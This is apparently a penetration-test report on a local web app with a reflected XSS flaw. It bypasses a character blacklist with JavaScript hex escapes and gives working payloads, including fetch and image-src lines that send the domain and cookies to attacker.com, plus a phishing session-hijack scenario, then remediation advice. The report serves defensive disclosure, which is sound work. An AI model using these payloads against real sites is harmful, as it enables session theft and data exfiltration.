# Security Assessment Report

## Executive Summary

- **Target:** http://localhost:43287
- **Assessment Date:** October 28, 2025
- **Scope:** Authentication, XSS, SQL and Command Injection, SSRF, Authorization testing

## Summary by Vulnerability Type

**Authentication Vulnerabilities:**
No authentication vulnerabilities were found. The application implements no authentication system whatsoever - all endpoints are publicly accessible without credentials. This is an architectural security gap rather than an exploitable authentication bypass vulnerability.

**Authorization Vulnerabilities:**
No authorization vulnerabilities were found. The application has no authorization controls, user roles, or access restrictions. All resources are publicly accessible by design.

**Cross-Site Scripting (XSS) Vulnerabilities:**
One critical reflected XSS vulnerability was successfully exploited. The vulnerability exists in the `/page?name=` endpoint where user input is reflected into a JavaScript string context. The application's character blacklist blocking `<>'"` and uppercase letters can be bypassed using JavaScript hex escape sequences (`\x3c` for `<`, `\x3e` for `>`). Successful exploitation enables arbitrary JavaScript execution, data exfiltration to attacker-controlled servers, and potential session hijacking. The application explicitly disables browser XSS protections via `X-XSS-Protection: 0` header.

**SQL/Command Injection Vulnerabilities:**
No SQL or command injection vulnerabilities were found. The application uses no database (file-based storage only) and all subprocess execution uses parameterized array form with hardcoded arguments, preventing command injection.

**Server-Side Request Forgery (SSRF) Vulnerabilities:**
No SSRF vulnerabilities were found. While the application uses PhantomJS to load URLs, all URLs are server-controlled localhost addresses with cryptographically random filenames. User input affects file content only, not URL destination.

## Network Reconnaissance

**Security-Relevant Findings from Automated Scanning:**

**Open Ports & Exposed Services (nmap):**
- **Port 43287 (HTTP):** Primary application running Werkzeug/1.0.1 with Python 2.7.18 - **end-of-life software** (Python 2.7 EOL January 2020) with known unpatched CVEs
- **Port 5003 & 5004 (HTTP):** Additional Werkzeug instances on newer Python 3.8.17 (out of assessment scope)
- **Port 7777 (HTTP):** SimpleHTTPServer exposing directory listing functionality (potential information disclosure)
- **Port 49158 (HTTP):** Tailscale management interface requiring authentication (stronger security posture than main application)

**Security Misconfigurations (whatweb):**
- **Technology Stack Disclosure:** Server headers expose detailed version information (Werkzeug/1.0.1 Python/2.7.18), enabling targeted attacks against known vulnerabilities
- **End-of-Life Software:** Python 2.7.18 reached end-of-life in January 2020, contains unpatched security vulnerabilities including CVE-2021-3177, CVE-2021-23336, and CVE-2020-10735

**Subdomain Discovery (subfinder):**
Identified 15+ subdomains (mail.localhost, autodiscover.localhost, owa.regency.localhost, etc.) - these appear to be false positives from public DNS records and are not part of the target application's attack surface.

**Key Security Risks Identified:**
1. **Outdated Technology Stack:** Python 2.7.18 (EOL 2020) with known exploitable CVEs
2. **Information Disclosure:** Verbose server headers exposing technology versions
3. **HTTP-Only Communication:** No HTTPS/TLS encryption detected on primary application port
4. **Directory Listing Exposure:** Port 7777 serving directory listings

---

# Cross-Site Scripting (XSS) Exploitation Evidence

## Successfully Exploited Vulnerabilities

### XSS-VULN-01: Reflected XSS via JavaScript Hex Escape Sequence Bypass

**Summary:**
- **Vulnerable location:** `http://localhost:43287/page?name=<payload>`
- **Overview:** The application reflects user input into a JavaScript string context within a `<script>` tag, then passes it to `document.write()` for HTML rendering. While the application implements a character blacklist blocking `<>'"`, uppercase letters A-Z, and brackets `[]`, it fails to prevent JavaScript hex escape sequences (`\x3c` for `<`, `\x3e` for `>`). These escape sequences are evaluated by the JavaScript engine before `document.write()` renders them as HTML, creating a context mismatch vulnerability that enables arbitrary JavaScript execution and data exfiltration.
- **Impact:** An attacker can execute arbitrary JavaScript in the context of any victim who visits a malicious URL. This enables session hijacking (if cookies existed), credential theft via phishing overlays, unauthorized actions on behalf of the victim, and information disclosure from the DOM.
- **Severity:** Critical

**Prerequisites:**
None - This is a reflected XSS vulnerability that requires no authentication or special application state. Any anonymous user can exploit this vulnerability.

**Exploitation Steps:**

1. **Craft the malicious URL with hex escape bypass payload:**
   ```
   http://localhost:43287/page?name=\x3cimg src=x onerror=alert(document.domain)\x3e
   ```

   **Explanation:** The payload uses JavaScript hex escape sequences:
   - `\x3c` = `<` (bypasses the `<` character blacklist)
   - `\x3e` = `>` (bypasses the `>` character blacklist)
   - When embedded in a JavaScript string context, these are evaluated as `<img src=x onerror=alert(document.domain)>` before being passed to `document.write()`

2. **Navigate victim to the malicious URL** (for demonstration, navigate in browser):
   Open the URL in a browser or send to victim via phishing email, social media, or any other attack vector.

3. **JavaScript execution occurs automatically:**
   - The payload passes the character blacklist validation (no literal `<` or `>` characters detected)
   - The server embeds the payload into JavaScript: `var name = "\x3cimg src=x onerror=alert(document.domain)\x3e";`
   - JavaScript engine evaluates hex escapes, converting them to actual HTML metacharacters
   - `document.write()` renders the result as HTML: `<img src=x onerror=alert(document.domain)>`
   - The `onerror` event handler fires when the image fails to load (src=x is invalid)
   - `alert(document.domain)` executes, displaying "localhost"

**Proof of Impact:**

**Evidence 1: JavaScript Execution Confirmed**
- **Method:** Alert dialog demonstration
- **Result:** Alert dialog appeared with message "localhost", confirming arbitrary JavaScript execution in the browser context
- **Payload:** `http://localhost:43287/page?name=\x3cimg src=x onerror=alert(document.domain)\x3e`

**Evidence 2: Data Exfiltration to Attacker-Controlled Server**
- **Method:** Outbound HTTP request to attacker domain
- **Payload:** `http://localhost:43287/page?name=\x3cimg src=x onerror=fetch(\x27//attacker.com/steal?d=\x27%2bdocument.domain)\x3e`
- **Network Request Captured:** `[GET] http://attacker.com/steal?d=localhost`
- **Result:** Successfully exfiltrated the document domain value to an external attacker-controlled server, demonstrating complete XSS exploitation capability

**Evidence 3: Session Hijacking Capability (Cookie Theft)**
- **Method:** Cookie exfiltration via image src manipulation
- **Payload:** `http://localhost:43287/page?name=\x3cimg src=x onerror=this.src=\x27http://attacker.com/log?cookie=\x27%2bdocument.cookie%2b\x27;d=\x27%2bdocument.domain\x3e`
- **Network Requests Captured:** Multiple `[GET] http://attacker.com/log?cookie=;d=localhost` requests
- **Result:** Successfully demonstrated cookie exfiltration mechanism. While no session cookies exist in this application (no authentication implemented), the attack proves that if cookies were present, they would be exfiltrated to the attacker's server. The format `cookie=;d=localhost` shows the cookie value (empty) and domain being sent to the attacker.

**Real-World Attack Scenario:**
1. Attacker crafts phishing email with malicious link: `http://localhost:43287/page?name=\x3cimg src=x onerror=fetch(\x27http://attacker.com/steal?cookie=\x27%2bdocument.cookie)\x3e`
2. Victim clicks link while logged into the application
3. XSS payload executes in victim's browser
4. Victim's session cookie is sent to `http://attacker.com/steal?cookie=<SESSION_TOKEN>`
5. Attacker receives session token and can hijack victim's session
6. Attacker performs unauthorized actions as the victim

**Notes:**
- **No CSP Protection:** The application has no Content Security Policy header, allowing unrestricted script execution and external requests
- **X-XSS-Protection Disabled:** The application explicitly sets `X-XSS-Protection: 0`, disabling browser-based XSS filters
- **Uppercase Letter Constraint:** The blacklist blocks all uppercase letters (A-Z), limiting certain payloads but not preventing exploitation. Attackers can use lowercase-only payloads or JavaScript string manipulation methods to work around this constraint
- **PhantomJS Validation:** The application uses PhantomJS to validate XSS execution, confirming that payloads execute in a real browser context (not just reflection in HTML source)
- **Persistent in Browser History:** The reflected XSS payload appears in the URL, which may be logged in browser history, proxy logs, and referrer headers, creating additional attack vectors

**Remediation Recommendations:**
1. Implement proper context-aware output encoding using `json.dumps()` for JavaScript string contexts
2. Replace blacklist validation with whitelist validation (allow only alphanumeric characters and spaces)
3. Implement Content Security Policy (CSP) header: `Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'`
4. Enable browser XSS protection: `X-XSS-Protection: 1; mode=block`
5. Use Jinja2's automatic HTML escaping instead of Python string formatting
6. Set HTTPOnly flag on all session cookies (if authentication is implemented)
7. Upgrade to modern, supported software versions (Python 2.7.18 is end-of-life)
